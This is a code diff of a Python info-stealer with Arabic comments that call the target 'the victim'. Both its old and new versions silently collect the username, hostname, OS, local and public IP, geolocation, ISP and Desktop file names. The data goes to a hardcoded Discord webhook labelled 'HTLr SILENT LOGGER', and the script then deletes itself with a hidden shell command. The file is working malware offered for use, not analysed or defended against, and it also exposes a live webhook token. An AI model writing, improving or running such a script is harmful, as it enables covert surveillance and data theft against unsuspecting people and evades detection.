@@ -2,117 +2,112 @@ import os
 import sys
 import platform
 import socket
-import requests
 import json
 import subprocess
 import time
-import shutil
+import urllib.request
 from datetime import datetime
 
-# --- إعداداتك الخاصة ---
+# --- إعداداتك الخاصة (الويبهوك حقك) ---
 WEBHOOK_URL = "https://discord.com/api/webhooks/1485705281399951380/vq0MMpRxWwbxu81_b2sH0NyCuwJNylU105PRJCF37kwFDwuLbRMvnroWGai3a1dZ6ApE"
 TAG = "#HTLr"
 MSG_FOOTER = "Z7F LINK TRACK | DENGER ☢️"
 
-def capture_everything():
-    """جمع أدق التفاصيل من جهاز الضحية بصمت"""
-    intel = {}
-    try:
-        # 1. معلومات الجهاز الأساسية
-        intel['user'] = os.getlogin()
-        intel['pc_name'] = socket.gethostname()
-        intel['os'] = f"{platform.system()} {platform.release()} ({platform.version()})"
-        intel['arch'] = platform.machine()
-        intel['cpu'] = platform.processor()
-        
-        # 2. معلومات الشبكة والآيبي والحارة
-        try:
-            r = requests.get('http://ip-api.com/json/').json()
-            intel['pub_ip'] = r.get('query')
-            intel['isp'] = r.get('isp')
-            intel['location'] = f"{r.get('city')}, {r.get('regionName')}, {r.get('country')}"
-            intel['coords'] = f"Lat: {r.get('lat')}, Lon: {r.get('lon')}"
-        except:
-            intel['pub_ip'] = "N/A"
-
-        # 3. سحب قائمة الملفات الحساسة (الأكثر أهمية)
-        files_summary = []
-        paths = {
-            "Desktop": os.path.join(os.path.expanduser('~'), 'Desktop'),
-            "Documents": os.path.join(os.path.expanduser('~'), 'Documents'),
-            "Downloads": os.path.join(os.path.expanduser('~'), 'Downloads')
-        }
-        
-        for name, path in paths.items():
-            if os.path.exists(path):
-                files_summary.append(f"--- {name} ---")
-                files_list = os.listdir(path)
-                files_summary.extend(files_list[:15]) # أول 15 ملف من كل مجلد لسرعة الأداة
-
-        intel['files_list'] = "\n".join(files_summary)
-        
-        # 4. سحب البرامج المثبتة (لمعرفة زلات الضحية)
-        if os.name == 'nt':
-            try:
-                apps = subprocess.check_output(['wmic', 'product', 'get', 'name']).decode('utf-8', errors='ignore')
-                intel['apps'] = apps[:500] 
-            except:
-                intel['apps'] = "Locked/Access Denied"
-
-    except Exception as e:
-        intel['error'] = str(e)
-    
-    return intel
-
-def send_payload(intel):
-    """إرسال المعلومات للويبهوك بتنسيق هجماتي احترافي"""
-    embed = {
-        "title": f"🔓 تم اختراق صيدة جديدة! [{TAG}]",
-        "description": f"المعلومات المسحوبة من جهاز الضحية بصمت التام.",
-        "color": 16711680, # أحمر ناري
-        "fields": [
-            {"name": "👤 الضحية", "value": f"```User: {intel['user']}\nPC: {intel['pc_name']}```", "inline": True},
-            {"name": "🌐 الشبكة والآيبي", "value": f"```IP: {intel['pub_ip']}\nLoc: {intel.get('location', 'N/A')}```", "inline": True},
-            {"name": "💻 تفاصيل النظام", "value": f"```{intel['os']}```", "inline": False},
-            {"name": "📡 الإحداثيات", "value": f"`{intel.get('coords', 'N/A')}`", "inline": True},
-            {"name": "🏢 المزود (ISP)", "value": f"`{intel.get('isp', 'N/A')}`", "inline": True},
-            {"name": "📂 كشف الملفات (Desktop/Docs)", "value": f"```\n{intel.get('files_list', 'No Files Access')[:1000]}```", "inline": False}
-        ],
-        "footer": {"text": f"{MSG_FOOTER} | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"},
-        "thumbnail": {"url": "https://i.imgur.com/G4YUpV7.png"}
+def send_to_discord(embed_data):
+    """دالة إرسال البيانات باستخدام urllib (مدمجة في بايثون)"""
+    payload = {
+        "username": "HTLr SILENT LOGGER",
+        "embeds": [embed_data]
     }
-    
-    payload = {"username": "HTLr SILENT LOGGER", "embeds": [embed]}
+    data = json.dumps(payload).encode('utf-8')
+    req = urllib.request.Request(WEBHOOK_URL, data=data, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'})
     try:
-        requests.post(WEBHOOK_URL, json=payload)
-    except:
+        with urllib.request.urlopen(req) as response:
+            pass
+    except Exception as e:
+        # لو تبي تشوف الخطأ في جهازك وقت التجربة فك التعليق عن السطر اللي تحت
+        # print(f"Error: {e}")
         pass
 
+def capture_intel():
+    """جمع كل المعلومات الممكنة بصمت"""
+    intel = {}
+    
+    # 1. معلومات الجهاز والنظام
+    intel['user'] = os.getlogin() if os.name == 'nt' else os.getenv('USER', 'Unknown')
+    intel['pc_name'] = socket.gethostname()
+    intel['os'] = f"{platform.system()} {platform.release()}"
+    intel['ip_local'] = socket.gethostbyname(intel['pc_name'])
+    
+    # 2. جلب الآيبي الخارجي والموقع (باستخدام urllib)
+    try:
+        with urllib.request.urlopen('http://ip-api.com/json/') as response:
+            geo = json.loads(response.read().decode())
+            intel['pub_ip'] = geo.get('query', 'N/A')
+            intel['loc'] = f"{geo.get('city')}, {geo.get('country')}"
+            intel['isp'] = geo.get('isp', 'N/A')
+    except:
+        intel['pub_ip'] = "N/A"
+        intel['loc'] = "Unknown"
+        intel['isp'] = "N/A"
+
+    # 3. سحب قائمة ملفات سطح المكتب (أهم زلات الضحية)
+    try:
+        desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
+        if os.path.exists(desktop_path):
+            files = os.listdir(desktop_path)
+            intel['files'] = "\n".join(files[:20]) # أول 20 ملف
+        else:
+            intel['files'] = "Desktop path not found"
+    except:
+        intel['files'] = "Access Denied"
+
+    return intel
+
 def self_destruct():
-    """انتحار الملف: مسح السكربت من الجهاز نهائياً بصمت"""
+    """المهمة الانتحارية: حذف الملف بعد الإرسال"""
     path = os.path.abspath(sys.argv[0])
     try:
         if os.name == 'nt': # Windows
-            # تشغيل أمر مسح الملف بعد 3 ثواني لإعطاء وقت للإغلاق
-            subprocess.Popen(f"timeout /t 3 & del /f /q \"{path}\"", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
-        else: # Linux/Android
+            # أمر حذف صامت بعد 3 ثواني
+            cmd = f"timeout /t 3 & del /f /q \"{path}\""
+            subprocess.Popen(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        else: # Linux / Mac / Mobile
             os.remove(path)
     except:
         pass
 
 def main():
-    # الأداة تعمل بصمت بدون طباعة برنت (إلا للتمويه لو بغيت)
+    # الأداة تعمل في الخلفية بصمت
     try:
-        # الحصول على كل المعلومات
-        intel_data = capture_everything()
-        # إرسالها فوراً
-        send_payload(intel_data)
-    except:
+        # 1. جمع المعلومات
+        data = capture_intel()
+        
+        # 2. تجهيز الإيمبد الفخم
+        embed = {
+            "title": f"⚡ صيدة جديدة وصلت! [{TAG}] ⚡",
+            "description": "تم اختراق معلومات الضحية بنجاح بصمت تام.",
+            "color": 16711680, # أحمر
+            "fields": [
+                {"name": "👤 الضحية", "value": f"```User: {data['user']}\nPC: {data['pc_name']}```", "inline": True},
+                {"name": "🌐 المعلومات الشبكية", "value": f"```IP: {data['pub_ip']}\nLoc: {data['loc']}```", "inline": True},
+                {"name": "💻 نظام التشغيل", "value": f"```{data['os']}```", "inline": False},
+                {"name": "📡 شركة الاتصال (ISP)", "value": f"```{data['isp']}```", "inline": False},
+                {"name": "📂 ملفات سطح المكتب المختفية", "value": f"```\n{data['files'][:800]}```", "inline": False}
+            ],
+            "footer": {"text": f"{MSG_FOOTER} | {datetime.now().strftime('%H:%M:%S')}"}
+        }
+        
+        # 3. الإرسال للويبهوك
+        send_to_discord(embed)
+        
+    except Exception:
         pass
-    finally:
-        # الانتحار والمسح
-        self_destruct()
-        sys.exit()
+    
+    # 4. الانتحار (حذف الملف)
+    time.sleep(1)
+    self_destruct()
+    sys.exit()
 
 if __name__ == "__main__":
     main()
